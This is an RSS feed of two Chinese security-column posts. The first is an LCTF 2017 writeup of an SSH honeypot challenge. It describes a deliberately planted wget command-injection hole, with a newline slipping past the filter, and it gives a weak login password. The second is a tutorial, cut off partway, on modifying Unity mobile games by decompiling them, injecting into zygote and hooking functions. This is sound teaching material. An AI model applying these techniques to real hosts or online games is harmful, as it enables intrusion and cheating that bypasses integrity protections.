<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Tue, 21 Nov 2017 22:56:30 +0800</lastBuildDate>
<item>
<title>LCTF 2017 未解之谜：树莓派 Writeup</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-21-31256263.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;LCTF 2017 未解之谜：树莓派 Writeup&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31256263&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ddba89a70d915f9f029d273a28ec2d1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在刚刚结束的 &lt;a href=&quot;http://lctf.pwnhub.cn/&quot;&gt;LCTF 2017&lt;/a&gt; 中，仍有一些未解的题目，今天笔者就来和各位胖友分享第一道未解之谜—— Misc 类下的「树莓派」，Writeup 来自本次比赛主办方 L-Team 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: 其它未解之谜见文末链接。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;作者：L-Team&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  刚上线&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1f7d0b870059146a98278673115cb54b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;582&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;题目介绍只给了个 IP ，有师傅当做 Web 题，发现点不开。&lt;/li&gt;&lt;li&gt;扫了一波端口后，只有 22 开着，所以入口点肯定在这里。&lt;/li&gt;&lt;li&gt;根据题目的提示，按照正常的思维确实应该登录 `pi:raspberry` ，本来也是打算设置成这样，但是这个密码太弱了，题目还没上线就被黑铲扫了好几波，直接改密码种木马一波带走了。所以就改了一个需要一些脑洞的密码 `pi:shumeipai` ，可能有师傅在这里卡了一下。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第一个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint1：都告诉你密码了&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;1. 这个 hint 主要提示弱密码是什么，因为不想让师傅们耽误太多时间，给出后很多师傅都上来了。&lt;/p&gt;&lt;p&gt;2. 这时候 SSH 进去会发现是一个低权限帐号，很多操作都受限了，`uname` 看内核版本也很高，这之后很多师傅就开始四处搜刮 `flag` ，`bash_history` 、`.swp` 等等，还看了所有文件的修改时间。&lt;/p&gt;&lt;p&gt;3. 但是一番搜索后除了那个假 flag 什么发现也没有。在搜索的过程中，查看主机的网络状态`netstat -autpn`，会发现所有的 SSH 连接来源都是 `172.18.0.3` ，在这里应该会产生一些疑问，ping `172.18.0.1`、`172.18.0.3` 都是通的，pi 本机是 `172.18.0.2` 。&lt;/p&gt;&lt;p&gt;4. 这时候可以猜测，SSH连接被 `0.3` 动了手脚，通过 SSH 的指纹完全可以验证 `0.3` 是师傅们和 `0.2` 之间的中间人。&lt;/p&gt;&lt;p&gt;5. 下图是我们 SSH 连接时收到的公钥指纹&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b346c41cf3100d61bcfef792c2427d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1130&quot; data-rawheight=&quot;737&quot;&gt;&lt;p&gt;6. 下图是 `172.18.0.2` 主机 SSHD 配置文件夹中的公钥:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-60655542670698bad173a9569ccfc49d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1133&quot; data-rawheight=&quot;198&quot;&gt;&lt;p&gt;7. 可以看出两者是不一样的，所以验证了 `0.3` 在做 SSH 连接的中间人的猜测，这样一来有很大可能真的flag在 `0.3` 里。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第二个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint：pcap&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1.这是一个很重要的 hint ，流量中出现的主要IP是 `172.18.0.2` `172.18.0.3` ，在流量包里可以看到明显的特征：在建立了 SSH 连接后，外网发给 `0.3` 的加密数据包，`0.3` 会先与 `0.2` 通信，`0.2` 返回给 `0.3` 数据后，`0.3` 再返回给外网的 IP ，在这里也能够证实 `0.3` 在做 SSH 的中间人。&lt;/p&gt;&lt;p&gt;2. 一般打 CTF 的流量包里面都会藏一些有用的东西，所以这里设了个坑，下载了一个 `53.bin` ，但是文件的具体内容没有什么用，此文件实际上是之前部署在公网的蜜罐捕获到的 DDos 木马，所以先对执行了此文件的师傅说声对不起。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-acf16242ced2773eb984ab5dc848d42e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1422&quot; data-rawheight=&quot;957&quot;&gt;&lt;p&gt;3. 但是下载这个 `53.bin` 也不完全是坑人的，流量包里的 Http 都很重要，过滤一下 Http 可以看到只有几个数据包，`User-Agent` 是 wget ，wget 了 `cip.cc` ，并重定向到了 `www.cip.cc` ，这么做的初衷了为了暴露题目的公网 IP ，但是师傅们后来决定先不放这个流量包，所以题目描述直接把 IP 给出来了，这里也没什么用了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2fa186d9a6b1824cfab471f752f3d04d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1517&quot; data-rawheight=&quot;719&quot;&gt;&lt;p&gt;4. 那为什么 `53.bin` 有 `request` 没有 `response` 捏，实际上 Follow 一下 TCP stream 就能看到后面的都是二进制的数据，Wireshark 没有把他们识别为 HTTP 协议。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-62ea62905871068ed004219306d267bc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1522&quot; data-rawheight=&quot;765&quot;&gt;&lt;p&gt;5. 实际上这个包最关键的地方在下图中两个 `GET 53.bin` ，这里涉及到一些蜜罐的东西，玩过 SSH 蜜罐的师傅可能了解，入侵者下载的恶意文件很可能随着执行而自动删除，所以绝大多数 SSH 蜜罐，无论低中高交互都会有一个功能，就是碰到 wget 命令，会解析命令并自动下载里面包含的恶意文件，这也就解释了为什么 wget 命令在两台主机上都执行了一次。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-54c554af387d77a1ce13dc56cac506f4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;886&quot; data-rawheight=&quot;43&quot;&gt;&lt;p&gt;6. 所以如果 wget 命令及参数没有解析好的话，是有可能导致命令注入的。这一点在后面的 hint 也有提示。这个漏洞我比较粗暴的设置为，当 `0.3` 主机得到了攻击者的命令，如果命令以 wget 为开头，則直接 `os.system(cmd)` ，当然还是做了一些过滤的。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2509472554cb9bc404c51dc3cd77637_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;948&quot; data-rawheight=&quot;382&quot;&gt;&lt;p&gt;7. 可以看到 Shell 里常见的引入新的命令的符号大多数都做了过滤，比如 `&amp;amp; | $()` ，但是还是留下了姿势可以绕过，比如 `\n` ，&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dda8502820250d40b96c57de63b1fdbc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;106&quot;&gt;&lt;p&gt;8. ssh tunnel 的应用除了我们常用的 shell ，实际上还有 exec ，此应用不会在 sshd 上请求 shell ，只执行一条命令，比如 `ssh &lt;a href=&quot;mailto:pi@123.123.123.123&quot;&gt;pi@123.123.123.123&lt;/a&gt; &#39;ls&#39;`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;9. 但为了方便构造，可以使用 python 的 `paramiko` 库来 Get flag&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-82b8817b210536f2f3f4cdc69102a75f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;151&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8f2d47d8b03554a8053c524b87590f05_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1129&quot; data-rawheight=&quot;284&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;10. 实际上也可以直接 Getshell&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bc55605618eabf2f967428ebbe58ef9d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;406&quot;&gt;&lt;h2&gt;&lt;b&gt;0X03  最后&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;1. wetland 是我之前写的一个高交互 SSH 蜜罐，基于 python 的 `paramiko` 库。这个题就是直接拿它改动了一点。地址在&lt;a href=&quot;https://github.com/ohmyadd&quot;&gt;本 github 账号&lt;/a&gt;的 wetland 仓库里。&lt;/p&gt;&lt;p&gt;2. 题目的架构为真实云主机上跑两个 Docker 容器，分别为 `wetland(172.18.0.3)` 和 `sshd(172.18.0.2)` ，其中 wetland 是蜜罐程序，sshd 用于执行黑客的命令。&lt;/p&gt;&lt;p&gt;3. 两个容器的 Dockerfile 在 docker 文件夹中，sshd 是对 `rastasheep/ubuntu-sshd` 的修改，降低了权限。wetland 是对 docker hub 上 `ohmyadd/wetland` 镜像的修改，修改了两个文件，加上了命令注入。&lt;/p&gt;&lt;p&gt;4. 最后既然是蜜罐，肯定会记录执行的操作啦，日志文件都有保留，但不知道公开合不合适，就先不放出来了。&lt;/p&gt;&lt;p&gt;5. 最后一张用 bearychat 来实时看都有什么操作 :-)&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1a9f083ef060bf0ab80b30012d1ec9a0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;344&quot; data-rawheight=&quot;600&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;LCTF 2017 其它未解之谜在这里&lt;/b&gt;：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/LCTF-2017-%E6%9C%AA%E8%A7%A3%E4%B9%8B%E8%B0%9C%EF%BC%9ABeRealDriver-Writeup/&quot;&gt;LCTF 2017 未解之谜：BeRealDriver &amp;amp;&amp;amp; YublKey Writeu&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/Py-trade2-Writeup/&quot;&gt;LCTF 2017 未解之谜：Py.trade2 Writeup&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;欢迎各位在评论区留言，与我们交流喔！本次比赛其它 Writeup 也将陆续发出！&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-21-31256263</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Unity游戏菜鸡玩家的制胜之路</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-07-30703785.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Unity游戏菜鸡玩家的制胜之路&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30703785&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de83ed6f668f836c15e2e6f1b2dbf37_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：赵奇&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;笔者一直自认玩过不少游戏，无奈水平太菜，日常送人头。痛定思痛，决定冲(xie)冠(xiu)一(gai)怒(qi)，经过几次失败的尝试之后，终于搞定了几款时下热门的Unity游戏。出于各种原因，本文以一款不具名的国外游戏作为实例，分享笔者研究过程中的一些心得，与各位分享。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X00 打包党的鶸改法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先采用最简单的打包党策略，演示一下如何快速修改一款单机游戏的金币/宝石等资源。这部分快速带过，主要负责熟悉 Unity 游戏结构，时至今日已经不算一种技术了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先将游戏安装 APK 解包，这里使用 apktool 或者直接看作 zip 解包是没有区别的，因为游戏严重依赖框架，Java 层和 Manifest 等文件价值不大。作为 Unity 游戏的一个特征点，可以很明显的发现这样一个文件夹。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9320e6f5de0d528d1a8bd36a5bc0e05_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;Assembly-CSharp.dll 等几个文件是 Unity 游戏最鲜明的特点。通过 file 或者 binwalk 查看可以发现它们是 C# 字节码格式（ IL ），这种格式如果不进行加密，可以轻松的还原 C#指令。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来在手机中安装一次游戏，看一下大致的游戏逻辑，确定需要修改什么。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dd04206c80d68d8d1f883a87870941e_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;999&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看起来右上角的宝石不错。。。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一般来说在游戏里边宝石都是稀缺资源，这里以其作为目标。为了快速定位，尝试使用 diamond ，gem 等字符串在 cs源码中进行全局搜索，很快就能定位到关键位置。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void SetupFirebaseDefault()
	{
		this.Defaults.Add(&quot;EnergyStart&quot;, 20);
		this.Defaults.Add(&quot;InitialEnergy&quot;, 75);
		this.Defaults.Add(&quot;EnergyFillerSecs&quot;, 420);
		this.Defaults.Add(&quot;InitialGold&quot;, 200);
		this.Defaults.Add(&quot;InitialGems&quot;, 50);
		this.Defaults.Add(&quot;XpRequirement&quot;, 75);
		this.Defaults.Add(&quot;XpReqIncremental&quot;, 75);
		this.Defaults.Add(&quot;XpAttackBonus&quot;, 5);
		this.Defaults.Add(&quot;BubblesRequired&quot;, 6);
		this.Defaults.Add(&quot;StoreBubbleCostsAddOn&quot;, 2);
		this.Defaults.Add(&quot;ReviveCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCostIncremental&quot;, 75);
		this.Defaults.Add(&quot;ShopTokenMax&quot;, 10);
		this.Defaults.Add(&quot;ShopFigMax&quot;, 3);
		this.Defaults.Add(&quot;ShopKeyMax&quot;, 5);
		this.Defaults.Add(&quot;EnergyPricesInGemsBig&quot;, 200);
		this.Defaults.Add(&quot;EnergyPricesInGemsSmall&quot;, 50);
		this.Defaults.Add(&quot;EnergyPackageBig&quot;, 60);
		this.Defaults.Add(&quot;EnergyPackageSmallMin&quot;, 5);
		this.Defaults.Add(&quot;RepeatedFigurineTokenConversion&quot;, 7);
		this.Defaults.Add(&quot;RefreshLootCost&quot;, 20);
  		...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;InitialGems&lt;/b&gt; 字段明显是初始宝石数的意思，OK就它了。C# 字节码的修改有很多种方式，比较方便的工具是 Reflector ，这里因为没有这个工具，使用 ILDASM 反编译，随后修改， ILASM 重编译回去的方法。这两个工具都是微软官方提供的，当然可以百度搜到。 ILDASM 具有图形化界面，直接从其中 dump 出来即可，随后修改 dump 出的 IL 文件如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-15e025904749d92edc40d35aa06a10e5_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;122&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来使用 ILASM 命令 ilasm.exe &lt;a href=&quot;http://name.il/&quot;&gt;name.il&lt;/a&gt; /DLL 可以将 IL 文件回编译成 DLL ，将其替换 APK 包中的对应 DLL ，签名，安装之后可以发现修改生效了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f36c27ef8344b7b5789693438fb3de2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1019&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这就是 Unity 游戏打包党快速修改的过程，看起来很简单，但是却存在不少问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;这个游戏没有做任何保护，一旦存在保护，比如IL字节码加密，就需要去跟IL字节码加载的逻辑，伺机恢复明文IL字节码。&lt;/li&gt;&lt;li&gt;加壳问题，好在加壳是针对Java层的，考查了国内几款主流游戏之后发现基本没有加壳，因为壳并不能保证ELF文件的安全，ELF文件很可能使用其他安全策略。&lt;/li&gt;&lt;li&gt;重打包问题，国内游戏是不可能让你修改数据重打包的，特别是联网游戏，会有多处完整性校验，因此修改工作必须在运行过程中进行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;综合以上，我们虽然完成了对一款毫无安全保护的 Unity 游戏的修改，但是为了进一步研究适用于更复杂条件下的修改策略，还需要进一步研究心得方案。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  注入与hook&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;考虑到国内主流游戏的安全机制，必须使用运行时修改的方式。比较理想的方式是先注入 zygote 进程。zygote 进程是 Dalvik 虚拟机的孵化器进程。众所周知，常规的 Android APP 是运行在 Dalvik 虚拟机（或者其继承者 ART ）中的，虚拟机需要加载很多运行所需的库（&lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;如&lt;/a&gt; &lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;libdvm.so&lt;/a&gt; ），并且初始化虚拟机对象。这个过程费时费力，为了保证应用的启动速度，zygote被设计为虚拟机进程的父进程。当应用启动时，直接从 zygote 上 fork() 出来，继承其虚拟内存空间。因此，注入到 zygote 进程的好处是先于应用代码执行，可以有效避免注入过程被应用的 anti-ptrace 机制检测到。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Android 平台上的注入已经是相对成熟的一套代码，最初是由看雪版主古河大大发布，随后出现了很多的更新、优化版本。其基本思路是利用 Linux 平台上的跨进程控制机制 ptrace ，通过对 ptrace 的封装实现目标进程的读、写，寄存器获取、保存、恢复，页状态变更、写入一段施工程序、远程调用施工程序，负责将待注入模块加载到目标内存中。这些内容前人之述备矣，这里贴几个相关链接，不在做具体展开。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt; libinject&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/jiayy/p/4286828.html&quot;&gt;android hook 框架 libinject2 简介、编译、运行&lt;/a&gt; libinject2&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/qq1084283172/article/details/53869796&quot;&gt;Android进程的so注入--Poison（稳定注入版） - 水汐。2014 的专栏 - CSDN博客&lt;/a&gt; Poison注入框架&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在完成注入之后，我们的功能代码即可在目标进程中执行，接下来需要在目标进程中执行 hook 过程。通过 hook 技术，可以截断一个函数的执行流程并插入自定义的代码。针对 zygote 注入，这个问题稍微复杂。因为在我们注入 zygote 的时机，游戏进程还没有启动，因此无法直接 hook 到目标函数。后面将会介绍到，我们的目标函数是 native 层的 c 函数。因为 zygote 进程最后会 fork 成游戏进程，为了感知游戏进程中目标函数的加载，可以监控该函数所在的库的加载，那么就需要用到 linker 中的 dlopen 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void *dlopen(const char *filename, int flags);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 hook dlopen 函数并检查 filename 参数确定目标库的加载，随后再一次进行实际的功能性 hook ，hook 目标函数达到修改目的。也就是说，通过 zygote hook 的方式 hook 一个目标函数，需要进行两次 hook ，第一次是 hook linker 中的 dlopen 以确定目标模块的基址，第二次是在该模块中 hook 目标函数。这里有一个小问题是由于 dlopen 函数在每一个 zygote 的子进程中都会被 hook ，导致系统性能下降，一个解决方案是定期查看&lt;b&gt; /proc/pid/cmdline&lt;/b&gt; 如果自身不是目标进程那么就解除 hook 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;针对 Unity 游戏的 hook 思路大体如上，本节的最后再讲讲关于使用的 hook 框架。Hook 操作的原理可以理解为强行修改程序的代码段，通过修改目标地址上的字节码为 B ，JMP 等指令将指令流跳转到 hook 者控制的位置执行另一段指令。当然实际实现中复杂性远远大于这句描述，因为指令执行完毕之后通常需要返回到 hook 前的位置，如何保证 hook 点处指令、寄存器值等各种信息完好，是需要很大工作量的。Java 层的 hook 框架可以使用 XScript 、frida 、cydia substrate 等等，native 层笔者尝试过的有效工具有 cydia substrate和android-inline-hook ( &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt; )。ARM 平台上的 hook 工具开发有几个坑点，一个原因是由于 ARM 有大量位置相关代码，如果 hook 点在这种指令上，那么想要在异地恢复这条指令相当困难；另一个原因是 ARM 上存在 Thumb 指令集，需要考虑判断当前指令集并执行不同的操作。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了注入和 hook 两种工具，就可以完成对目标函数的运行时修改。下一节探讨针对 Unity 游戏，具体修改哪些函数可以完成对游戏逻辑的控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  Mono加载C#字节码过程分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;  可能很多人都像我一样好奇过，Android 是一个类 Java 虚拟机部署在 Linux 平台上，怎么就跑起来了微软的 C# ？其实 C# 已经被 ECMA 组织标准化（虽然这组织和微软渊源颇深），并且标准基础上出现了一套运行时（ Common Language Runtime , CLR ）。这套运行时的具体实现是一个叫做 mono 的开源项目。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本节介绍 mono 执行 C# 字节码的过程。Android 上的 Unity 正是通过 mono 的 Just-in-time Compile 机制完成了从 C# 语言世界到 ARM 机器码世界的转化。接下来对 Mono 项目的源码中对 DLL 处理的逻辑做一个分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，mono 加载 DLL 文件之后，会进行预编译，首先调用 &lt;b&gt;/mono/mini/mini.c&lt;/b&gt; 中的 mono_precompile_assemblies 函数，该函数对所有需要加载的 assembly 文件逐个调用 mono_precompile_assembly 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void mono_precompile_assemblies ()
{
	GHashTable *assemblies = g_hash_table_new (NULL, NULL);

	mono_assembly_foreach ((GFunc)mono_precompile_assembly, assemblies);

	g_hash_table_destroy (assemblies);
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static void
mono_precompile_assembly (MonoAssembly *ass, void *user_data)
{
	...
	for (i = 0; i &amp;lt; mono_image_get_table_rows (image, MONO_TABLE_METHOD); ++i) {
		method = mono_get_method (image, MONO_TOKEN_METHOD_DEF | (i + 1), NULL);
		mono_compile_method (method);
		if (strcmp (method-&amp;gt;name, &quot;Finalize&quot;) == 0) {
			invoke = mono_marshal_get_runtime_invoke (method, FALSE);
			mono_compile_method (invoke);
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里摘取了 mono_precompile_assembly 函数的关键步骤。该函数中针对当前需要处理的的 assembly ，对其中每一个函数调用 mono_compile_method 进行编译，同时编译 invoke 。这个 invoke 是对应函数的一个包装器，当  mono最终调用函数时，会通过包装器调用而不是直接调用。因此在函数 compile 完成之后，会生成并编译 invoke 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来分析的关键是 mono_compile_method 函数，真正的编译过程发生在这个函数中。该函数不是唯一的，因为 mono 同时支持 AOT（ ahead of time ）编译，未来也可能添加其他功能。因此这个函数这里为一个函数指针，在 JIT 编译环境下执行的是 mono_jit_compile_method 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gpointer
mono_jit_compile_method (MonoMethod *method)
{
	MonoException *ex = NULL;
	gpointer code;

	code = mono_jit_compile_method_with_opt (method, mono_get_optimizations_for_method (method, default_opt), &amp;amp;ex);
	if (!code) {
		g_assert (ex);
		mono_raise_exception (ex);
	}

	return code;
}
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个函数调用了 mono_jit_compile_method_with_opt 函数做具体操作，注意这里返回的是 gpointer 指针，其实这个指针指向的就是 DLL 脚本最终编译成汇编所在的地址，后续如果我们需要修改生成的汇编代码，修改这个指针即可。接下来我们稍微深入跟进一些。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static gpointer
mono_jit_compile_method_with_opt (MonoMethod *method, guint32 opt, MonoException **ex)
{
	...
    target_domain = mono_get_root_domain ();
	info = lookup_method (target_domain, method); //先查表判断是否已经编译
	if (info) {
		/* We can&#39;t use a domain specific method in another domain */
		if (! ((domain != target_domain) &amp;amp;&amp;amp; !info-&amp;gt;domain_neutral)) {
			MonoVTable *vtable;
			MonoException *tmpEx;

			mono_jit_stats.methods_lookups++;
			vtable = mono_class_vtable (domain, method-&amp;gt;klass);
			g_assert (vtable);
			tmpEx = mono_runtime_class_init_full (vtable, ex == NULL);
			if (tmpEx) {
				*ex = tmpEx;
				return NULL;
			}
			return mono_create_ftnptr (target_domain, info-&amp;gt;code_start);
		}
	}

	code = mono_jit_compile_method_inner (method, target_domain, opt, ex);//实际编译点
	···
	p = mono_create_ftnptr (target_domain, code);
    ···
	return p;
